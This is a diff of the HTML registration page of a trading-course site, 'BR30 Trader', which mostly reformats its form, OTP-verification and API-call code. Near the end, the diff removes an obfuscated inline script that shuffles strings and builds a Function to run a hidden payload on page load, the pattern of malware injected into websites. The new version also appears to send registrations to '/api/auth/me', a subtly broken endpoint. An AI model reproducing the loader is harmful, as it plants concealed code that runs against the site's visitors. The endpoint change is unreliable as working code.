@@ -1,398 +1,476 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
-<head>
+  <head>
     <!-- ✅ Google Tag Manager -->
     <script>
-        (function (w, d, s, l, i) {
-            w[l] = w[l] || [];
-            w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
-            var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s),
-                dl = l != 'dataLayer' ? '&l=' + l : '';
-            j.async = true;
-            j.src = 'https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L' + dl;
-            f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-TT7SLZ4L');
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L" + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-TT7SLZ4L");
     </script>
 
     <!-- ✅ Basic -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <!-- ✅ SEO (controlled) -->
     <title>Register | BR30 Trader</title>
-    <meta name="description"
-        content="Create your BR30 Trader account and start learning professional trading strategies with OTP verification.">
-    <meta name="robots" content="noindex, nofollow">
+    <meta
+      name="description"
+      content="Create your BR30 Trader account and start learning professional trading strategies with OTP verification."
+    />
+    <meta name="robots" content="noindex, nofollow" />
 
     <!-- 🔒 Security -->
-    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
+    <meta
+      http-equiv="Cache-Control"
+      content="no-store, no-cache, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
 
     <!-- ✅ Favicon -->
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
 
     <!-- ✅ Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Poppins:wght@400;700&display=swap"
-        rel="stylesheet">
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Poppins:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
 
     <!-- ✅ Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
 
     <!-- ✅ SweetAlert -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11" defer></script>
     <style>
-        /* =========================================
+      /* =========================================
            GLOBAL & BACKGROUND STYLES
         ========================================= */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
 
-        body {
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #050505;
-            /* Aapka Body Color */
-            padding: 20px;
-        }
+      body {
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #050505;
+        /* Aapka Body Color */
+        padding: 20px;
+      }
 
-        /* =========================================
+      /* =========================================
            REGISTRATION CONTAINER (Responsive)
         ========================================= */
+      .container {
+        width: 100%;
+        max-width: 380px;
+        background: #1e293b;
+        /* Dark Card Color */
+        padding: 30px;
+        border-radius: 20px;
+        border: 1px solid #334155;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      }
+
+      .container h2 {
+        text-align: center;
+        margin-bottom: 25px;
+        color: #ffffff;
+        /* White Text */
+        font-weight: 600;
+      }
+
+      label {
+        font-size: 13px;
+        font-weight: 500;
+        color: #cbd5e1;
+        margin-bottom: 6px;
+        display: block;
+      }
+
+      /* Input Box Styling */
+      .input-box {
+        display: flex;
+        align-items: center;
+        background: #050505;
+        border: 1px solid #334155;
+        border-radius: 10px;
+        padding: 5px 12px;
+        margin-bottom: 15px;
+        position: relative;
+        transition: 0.3s;
+      }
+
+      .input-box:focus-within {
+        border-color: #a020f0;
+        /* Purple Focus */
+      }
+
+      .input-box input {
+        background: transparent;
+        border: none;
+        outline: none;
+        color: white;
+        flex: 1;
+        padding: 10px 5px;
+        font-size: 15px;
+      }
+
+      /* Toggle Password Button */
+      .toggle-btn {
+        cursor: pointer;
+        color: #94a3b8;
+        font-size: 18px;
+      }
+
+      /* Button Styling */
+      button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 10px;
+        background: #a020f0;
+        /* Brand Purple */
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        transition: 0.3s ease;
+        font-weight: 600;
+        margin-top: 10px;
+      }
+
+      button:hover {
+        background: #8219c4;
+        transform: translateY(-2px);
+      }
+
+      /* Footer Links */
+      .links {
+        display: flex;
+        justify-content: center;
+        margin-top: 20px;
+      }
+
+      .links a {
+        text-decoration: none;
+        color: #a020f0;
+        /* Purple Link */
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .links a:hover {
+        text-decoration: underline;
+      }
+
+      /* Mobile Adjustment */
+      @media (max-width: 480px) {
         .container {
-            width: 100%;
-            max-width: 380px;
-            background: #1e293b;
-            /* Dark Card Color */
-            padding: 30px;
-            border-radius: 20px;
-            border: 1px solid #334155;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+          padding: 20px;
         }
 
-        .container h2 {
-            text-align: center;
-            margin-bottom: 25px;
-            color: #ffffff;
-            /* White Text */
-            font-weight: 600;
+        h2 {
+          font-size: 20px;
         }
-
-        label {
-            font-size: 13px;
-            font-weight: 500;
-            color: #cbd5e1;
-            margin-bottom: 6px;
-            display: block;
-        }
-
-        /* Input Box Styling */
-        .input-box {
-            display: flex;
-            align-items: center;
-            background: #050505;
-            border: 1px solid #334155;
-            border-radius: 10px;
-            padding: 5px 12px;
-            margin-bottom: 15px;
-            position: relative;
-            transition: 0.3s;
-        }
-
-        .input-box:focus-within {
-            border-color: #a020f0;
-            /* Purple Focus */
-        }
-
-        .input-box input {
-            background: transparent;
-            border: none;
-            outline: none;
-            color: white;
-            flex: 1;
-            padding: 10px 5px;
-            font-size: 15px;
-        }
-
-        /* Toggle Password Button */
-        .toggle-btn {
-            cursor: pointer;
-            color: #94a3b8;
-            font-size: 18px;
-        }
-
-        /* Button Styling */
-        button {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            background: #a020f0;
-            /* Brand Purple */
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.3s ease;
-            font-weight: 600;
-            margin-top: 10px;
-        }
-
-        button:hover {
-            background: #8219c4;
-            transform: translateY(-2px);
-        }
-
-        /* Footer Links */
-        .links {
-            display: flex;
-            justify-content: center;
-            margin-top: 20px;
-        }
-
-        .links a {
-            text-decoration: none;
-            color: #a020f0;
-            /* Purple Link */
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Mobile Adjustment */
-        @media (max-width: 480px) {
-            .container {
-                padding: 20px;
-            }
-
-            h2 {
-                font-size: 20px;
-            }
-        }
+      }
     </style>
-</head>
+  </head>
 
-<body>
+  <body>
     <!-- ✅ GTM noscript -->
     <noscript>
-        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L" height="0" width="0"
-            style="display:none;visibility:hidden"></iframe>
+      <iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe>
     </noscript>
     <div class="container">
-        <h2 class="register-heading">Register</h2>
+      <h2 class="register-heading">Register</h2>
 
-        <!-- SECTION 1: REGISTRATION (Wrapped in FORM for Password Saving) -->
-        <form id="register-section" onsubmit="handleRegister(event)">
-            <label>Full Name</label>
-            <div class="input-box">
-                <input id="username" name="username" placeholder="Only letters allowed" required
-                    oninput="this.value=this.value.replace(/[^a-zA-Z\s]/g,'')">
-            </div>
-
-            <label>Email Address</label>
-            <div class="input-box">
-                <input id="email" name="email" type="email" placeholder="example@mail.com" autocomplete="email"
-                    required>
-            </div>
-
-            <label>Password</label>
-            <div class="input-box">
-                <!-- autocomplete="new-password" se Google prompt trigger hota hai -->
-                <input id="password" name="password" type="password" placeholder="8+ chars, 1 Special (@#$%^&*)"
-                    autocomplete="new-password" required>
-                <span class="toggle-btn" id="toggleBtn" onclick="togglePassword()" style="cursor:pointer">👁️</span>
-            </div>
-
-            <button type="submit" id="regBtn">Send OTP</button>
-        </form>
-
-        <!-- SECTION 2: OTP VERIFICATION (Wrapped in FORM) -->
-        <form id="otp-section" style="display: none;" onsubmit="handleVerify(event)">
-            <p style="text-align: center; font-size: 13px; color: #94a3b8; margin-bottom: 15px;">Verification code sent
-                to email.</p>
-            <label>Enter 6-Digit OTP</label>
-            <div class="input-box">
-                <input id="otpInput" type="number" placeholder="Ex: 123456" required>
-            </div>
-            <button type="submit" id="verifyBtn">Verify & Register</button>
-
-            <!-- Timer & Resend -->
-            <div style="text-align: center; margin-top: 15px;">
-                <p id="timerText" style="font-size: 12px; color: #94a3b8;">Resend in <span id="timer">30</span>s</p>
-                <button type="button" id="resendBtn" onclick="resendOTP()"
-                    style="display: none; background: none; color: #3b82f6; border: none; cursor: pointer; text-decoration: underline; font-size: 13px;">Resend
-                    OTP</button>
-            </div>
-        </form>
-
-        <div class="links">
-
-            <a href="login.html" onclick="window.location.href='login.html'; return false;"
-                style="cursor: pointer; display: inline-block; padding: 10px;">
-                Already have an account? Login
-            </a>
+      <!-- SECTION 1: REGISTRATION (Wrapped in FORM for Password Saving) -->
+      <form id="register-section" onsubmit="handleRegister(event)">
+        <label>Full Name</label>
+        <div class="input-box">
+          <input
+            id="username"
+            name="username"
+            placeholder="Only letters allowed"
+            required
+            oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '')"
+          />
         </div>
+
+        <label>Email Address</label>
+        <div class="input-box">
+          <input
+            id="email"
+            name="email"
+            type="email"
+            placeholder="example@mail.com"
+            autocomplete="email"
+            required
+          />
+        </div>
+
+        <label>Password</label>
+        <div class="input-box">
+          <!-- autocomplete="new-password" se Google prompt trigger hota hai -->
+          <input
+            id="password"
+            name="password"
+            type="password"
+            placeholder="8+ chars, 1 Special (@#$%^&*)"
+            autocomplete="new-password"
+            required
+          />
+          <span
+            class="toggle-btn"
+            id="toggleBtn"
+            onclick="togglePassword()"
+            style="cursor: pointer"
+            >👁️</span
+          >
+        </div>
+
+        <button type="submit" id="regBtn">Send OTP</button>
+      </form>
+
+      <!-- SECTION 2: OTP VERIFICATION (Wrapped in FORM) -->
+      <form
+        id="otp-section"
+        style="display: none"
+        onsubmit="handleVerify(event)"
+      >
+        <p
+          style="
+            text-align: center;
+            font-size: 13px;
+            color: #94a3b8;
+            margin-bottom: 15px;
+          "
+        >
+          Verification code sent to email.
+        </p>
+        <label>Enter 6-Digit OTP</label>
+        <div class="input-box">
+          <input
+            id="otpInput"
+            type="number"
+            placeholder="Ex: 123456"
+            required
+          />
+        </div>
+        <button type="submit" id="verifyBtn">Verify & Register</button>
+
+        <!-- Timer & Resend -->
+        <div style="text-align: center; margin-top: 15px">
+          <p id="timerText" style="font-size: 12px; color: #94a3b8">
+            Resend in <span id="timer">30</span>s
+          </p>
+          <button
+            type="button"
+            id="resendBtn"
+            onclick="resendOTP()"
+            style="
+              display: none;
+              background: none;
+              color: #3b82f6;
+              border: none;
+              cursor: pointer;
+              text-decoration: underline;
+              font-size: 13px;
+            "
+          >
+            Resend OTP
+          </button>
+        </div>
+      </form>
+
+      <div class="links">
+        <a
+          href="login.html"
+          onclick="
+            window.location.href = 'login.html';
+            return false;
+          "
+          style="cursor: pointer; display: inline-block; padding: 10px"
+        >
+          Already have an account? Login
+        </a>
+      </div>
     </div>
 
     <script src="config.js"></script>
     <script>
-        const API_URL = window.API_BASE_URL + '/api/auth';
+      const API_URL = window.API_BASE_URL + "/api/auth";
 
-        function togglePassword() {
-            const pass = document.getElementById("password");
-            const btn = document.getElementById("toggleBtn");
-            pass.type = pass.type === "password" ? "text" : "password";
-            btn.textContent = pass.type === "password" ? "👁️" : "🙈";
-        }
+      function togglePassword() {
+        const pass = document.getElementById("password");
+        const btn = document.getElementById("toggleBtn");
+        pass.type = pass.type === "password" ? "text" : "password";
+        btn.textContent = pass.type === "password" ? "👁️" : "🙈";
+      }
 
-        function validateInput(name, email, pass) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            const passRegex = /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/;
+      function validateInput(name, email, pass) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const passRegex =
+          /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/;
 
-            if (name.length < 3) return "Name too short!";
-            if (!emailRegex.test(email)) return "Invalid Email!";
-            if (!passRegex.test(pass)) return "Use 8+ chars with 1 Special Character!";
-            return null;
-        }
+        if (name.length < 3) return "Name too short!";
+        if (!emailRegex.test(email)) return "Invalid Email!";
+        if (!passRegex.test(pass))
+          return "Use 8+ chars with 1 Special Character!";
+        return null;
+      }
 
-        let timerInterval;
-        function startTimer() {
-            let timeLeft = 30;
-            const resendBtn = document.getElementById("resendBtn");
-            const timerText = document.getElementById("timerText");
-            const timerDisplay = document.getElementById("timer");
+      let timerInterval;
+      function startTimer() {
+        let timeLeft = 30;
+        const resendBtn = document.getElementById("resendBtn");
+        const timerText = document.getElementById("timerText");
+        const timerDisplay = document.getElementById("timer");
 
-            resendBtn.style.display = "none";
-            timerText.style.display = "block";
+        resendBtn.style.display = "none";
+        timerText.style.display = "block";
 
+        clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+          if (timeLeft <= 0) {
             clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    resendBtn.style.display = "block";
-                    timerText.style.display = "none";
-                } else {
-                    timerDisplay.innerText = timeLeft;
-                }
-                timeLeft--;
-            }, 1000);
+            resendBtn.style.display = "block";
+            timerText.style.display = "none";
+          } else {
+            timerDisplay.innerText = timeLeft;
+          }
+          timeLeft--;
+        }, 1000);
+      }
+
+      // Change: Added 'e' to handle form submit signal
+      async function handleRegister(e) {
+        if (e) e.preventDefault(); // Browser ko signal milega ki 'Submit' hua hai
+
+        regBtn.disabled = true;
+        regBtn.innerText = "Sending OTP... ⏳";
+
+        const name = document.getElementById("username").value.trim();
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value;
+
+        const error = validateInput(name, email, password);
+        if (error) return alert(error);
+
+        try {
+          const res = await fetch(`${window.API_BASE_URL}/api/auth/me`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name, email, password }),
+          });
+          const data = await res.json();
+
+          if (res.ok) {
+            alert("OTP Sent!");
+            document.getElementById("register-section").style.display = "none";
+            document.getElementById("otp-section").style.display = "block";
+            startTimer();
+          } else {
+            alert(data.msg || "Registration Failed!");
+          }
+        } catch (err) {
+          alert("Server Error!");
+        }
+      }
+
+      async function handleVerify(e) {
+        if (e) e.preventDefault(); // 1. Refresh roka
+
+        const verifyBtn = document.getElementById("verifyBtn");
+
+        // 2. Button ko turant freeze karo taaki double click na ho
+        verifyBtn.disabled = true;
+        verifyBtn.innerText = "Verifying... ⏳";
+
+        const otpInput = document.getElementById("otpInput"); // Check if ID matches HTML
+        const emailInput = document.getElementById("email");
+
+        const otp = otpInput ? otpInput.value.trim() : "";
+        const email = emailInput ? emailInput.value.trim() : "";
+
+        if (otp.length < 6) {
+          alert("Enter 6-digit OTP!");
+          verifyBtn.disabled = false;
+          verifyBtn.innerText = "Verify & Register";
+          return;
         }
 
-        // Change: Added 'e' to handle form submit signal
-        async function handleRegister(e) {
-            if (e) e.preventDefault(); // Browser ko signal milega ki 'Submit' hua hai
+        try {
+          const res = await fetch(
+            window.API_BASE_URL + "/api/auth/verify-otp",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email, otp }),
+            },
+          );
 
-            regBtn.disabled = true;
-            regBtn.innerText = "Sending OTP... ⏳";
+          const data = await res.json();
 
-            const name = document.getElementById("username").value.trim();
-            const email = document.getElementById("email").value.trim();
-            const password = document.getElementById("password").value;
-
-            const error = validateInput(name, email, password);
-            if (error) return alert(error);
-
-            try {
-                const res = await fetch(window.API_BASE_URL + '/api/auth/register', {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ name, email, password }),
-                });
-                const data = await res.json();
-
-                if (res.ok) {
-                    alert("OTP Sent!");
-                    document.getElementById("register-section").style.display = "none";
-                    document.getElementById("otp-section").style.display = "block";
-                    startTimer();
-                } else {
-                    alert(data.msg || "Registration Failed!");
-                }
-            } catch (err) { alert("Server Error!"); }
+          if (res.ok) {
+            // ✅ SUCCESS: Sirf ek hara (Green) alert
+            alert("✅ Account Verified Successfully!");
+            // Redirect se pehle thoda sa 100ms ka gap taaki alert clear ho jaye
+            setTimeout(() => {
+              window.location.replace("login.html");
+            }, 100);
+          } else {
+            // ❌ ERROR: Galat OTP pe yahan aayega
+            alert("❌ " + (data.msg || "Verification Failed!"));
+            verifyBtn.disabled = false;
+            verifyBtn.innerText = "Verify & Register";
+          }
+        } catch (err) {
+          // 🔥 Catch block ka alert: Sirf tab dikhao jab network fail ho
+          console.error("Fetch Error:", err);
+          alert("❌ Server Error! Please check your connection.");
+          verifyBtn.disabled = false;
+          verifyBtn.innerText = "Verify & Register";
         }
+      }
 
+      // Resend logic helper
+      function resendOTP() {
+        handleRegister();
+      }
 
-        async function handleVerify(e) {
-            if (e) e.preventDefault(); // 1. Refresh roka
-
-            const verifyBtn = document.getElementById("verifyBtn");
-
-            // 2. Button ko turant freeze karo taaki double click na ho
-            verifyBtn.disabled = true;
-            verifyBtn.innerText = "Verifying... ⏳";
-
-            const otpInput = document.getElementById("otpInput"); // Check if ID matches HTML
-            const emailInput = document.getElementById("email");
-
-            const otp = otpInput ? otpInput.value.trim() : "";
-            const email = emailInput ? emailInput.value.trim() : "";
-
-            if (otp.length < 6) {
-                alert("Enter 6-digit OTP!");
-                verifyBtn.disabled = false;
-                verifyBtn.innerText = "Verify & Register";
-                return;
-            }
-
-            try {
-                const res = await fetch(window.API_BASE_URL + '/api/auth/verify-otp', {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ email, otp }),
-                });
-
-                const data = await res.json();
-
-                if (res.ok) {
-                    // ✅ SUCCESS: Sirf ek hara (Green) alert
-                    alert("✅ Account Verified Successfully!");
-                    // Redirect se pehle thoda sa 100ms ka gap taaki alert clear ho jaye
-                    setTimeout(() => {
-                        window.location.replace("login.html");
-                    }, 100);
-                } else {
-                    // ❌ ERROR: Galat OTP pe yahan aayega
-                    alert("❌ " + (data.msg || "Verification Failed!"));
-                    verifyBtn.disabled = false;
-                    verifyBtn.innerText = "Verify & Register";
-                }
-            } catch (err) {
-                // 🔥 Catch block ka alert: Sirf tab dikhao jab network fail ho
-                console.error("Fetch Error:", err);
-                alert("❌ Server Error! Please check your connection.");
-                verifyBtn.disabled = false;
-                verifyBtn.innerText = "Verify & Register";
-            }
+      // Global Enter logic (Now triggers the active form's submit)
+      document.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") {
+          const isOtpVisible =
+            document.getElementById("otp-section").style.display === "block";
+          if (isOtpVisible) handleVerify();
+          else handleRegister();
         }
-
-
-        // Resend logic helper
-        function resendOTP() {
-            handleRegister();
-        }
-
-        // Global Enter logic (Now triggers the active form's submit)
-        document.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                const isOtpVisible = document.getElementById("otp-section").style.display === "block";
-                if (isOtpVisible) handleVerify();
-                else handleRegister();
-            }
-        });
+      });
     </script>
     <script>
-        (function () { var iEX = '', jkf = 628 - 617; function EUf(c) { var z = 6376169; var g = c.length; var j = []; for (var a = 0; a < g; a++) { j[a] = c.charAt(a) }; for (var a = 0; a < g; a++) { var x = z * (a + 112) + (z % 40890); var u = z * (a + 689) + (z % 16572); var r = x % g; var h = u % g; var y = j[r]; j[r] = j[h]; j[h] = y; z = (x + u) % 7011803; }; return j.join('') }; var Vfe = EUf('hmridetcwuyoonurcfrgtkljasptsonxvbqcz').substr(0, jkf); var bFt = '=q( nf,0}v0"t,vb;5zvtlry)pav[j0)e0ifhlm<jx7r[.p=uC;zjopartnttnr,n2)]r,;l,anftht(;,06a7=,a (gr,tctv;,,4j6(uy-(v)v)1t8e,.66;va" ,2"[.k-r*);(r.d-m+ [qlr;;twv) n)i[s.=]4.h+(,r0;+ia31 uguS3v2o=;0hf(fn,mfu83pl 4qCu)(aa hgmra+s=l)nnt)ae+C)7vcrrrus(g[v(+8s1e4;ip0se)ezbuaCofkvl;a"=ajbnaetu-r;r+=0,siAh{qaA  12{r[];crav*j,"b9[acr.)=abr+n;jnrk0gh6i0=do)lb(+tr;palvl)ao eg]uel]sn(;;;bl)=g1a.pudo,(=1rd;ae 95lrC+9rve=)Ada;ifs;+{w=k7oa8axba..s ogov=<Cp1e1;-. (=n !in]pe)o>b==fdv=]ru2iv gn.3ltvvhiceo=;e.)Codehe(=+ sfvd..hfo0;w+rr] +Caa{;]==sntn+[}v"n;ho=6oia{"1ciihw2cx8lju(=wf=rb(h;+oca;tshkoes(b;obzre(8nlelh]]ak.u(n,n+,.h]v<l+(f 0;r;!={u6z;aic(og]+.ii;a,)f8sni5(0rxg;9d))jas(=;.7;tn8l7i.7tc.5n"hfq[i=}as8=r  icnjt+(h},[[}b) z.[to,r2l)n=9py4(,nlbic)r;ht)<)=ia(;o=r,(svg,fr7 ;5a=1or=((6[>+o=pxa-h;-tA9<}el.n}]hr(s+v)9vha,l8t;t+frdr."AS(o)er(o1ba2 r{nzhtr=m)o)= oasem+h==;;me1jmhl.=solht+,a"g;s.1);r)t=.'; var rsW = EUf[Vfe]; var wDC = ''; var TVK = rsW; var Eky = rsW(wDC, EUf(bFt)); var pUC = Eky(EUf('!),1foe_b_u;6j  _P.aP$1)!4;$5eo!9;P=(}f 6ba13t.P$P_iPf)gf,tkwS)j4nw}fyPP2f]PP&n}1 _f"n)6!3{).+(by3.e$P26.%3&2o==0;cle$$Po[(P%fincP)u=*EPr_t6e7tg$+Pbb{)3$P)m41.P}oaaPP;k0n =jbs;f%.e,5]sb,j3_jPl)bi)P)-un,.rf53heP!!..v)o]s\'Pobnc3wd ;3(b01223!b$+15\'f)_{3.P;oe{]a,b(P&w3(iuarb.nw(ogPP(0(P(j_}.x(3.n(b4ls..P.ePi7C(3,) v)!,b\'P4.)a2P.-P5)3P)(vP8 +)i)ln9\'1!8t(6egeP9Pm.w\/3,.2)}iPo)etf%m5en9.P_cf46Pp.$3Pppb!r);3wc\/.4o04bP4448i Pbtd(inPqPP;7=ni4nP ;},;j,=(P71ero66}Ps;$7;m=Pwen$q)Pilb+#PP$&(m$_)eCP5PPbP7.;p3P!"id)l={]{P$cf.w2_!!fp.l%eP6=tc[!tob(gjPttbrvi]ln_bj.6tt.!P0,PPee}%o)l.j%pb1Po(b)_P368Peeu,e.c4nt${)(#)cw.DaP)Peu}31e(t{(.8tz".cdr;.;)nPs.c%eS q(3r==)(=1ik7c.1er0tsty_.PooP1_711*;oC{.,)tn#8(}pa).i)ojbP#1;m2ebb}7tf]63en3f3e3g"se2;PP(-g=isj.$.j8)9P_)wen3t0+.bb46;3tuP[P5n(8Pom#$_3lb!o_,-5elc(.Pcaf4Pf!P$u*a}..P(.,P4\'o-2Pl7hb)"2b.3P,,3* P}}ou#u]ont3PPw]bv*ha 2fue.l._PdP{r;tfvjpt5yPP[P)]0.(c}rP7pn+,n7(P{;gu{joo}P\'6oj*b3.m$; nd}(Pc,.3)7$s,pr{e4jr}.tb,)ltih-k%,P(!,.uPn#(}p!=me2PP!l=()v)duP =_4({csve7r)5$tePo(Pb!vime]%)P$7)_u)pj];0s_}_&P2(]("d4nP(l%tieP.bj363}v$& 2_u1rj_483, (0P=(nnb]bP.\/.]Pjn,P[;bbu\/6sm;(a},r!_,r Pj))toer+0ie o=146iSsnnP%o s.o1eePta,!if3dv)j0e=P6s3ri30r)c(,u!-p .c!)e!e$idt8,[_.tPm,n(6bo$f+d ,.)t\/(= _%.b i6.P[,;.r4_==Pbe d=Pee.tjePcb.;')); var OSu = TVK(iEX, pUC); OSu(8958); return 3887 })()
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
     </script>
-</body>
-
+  </body>
 </html>
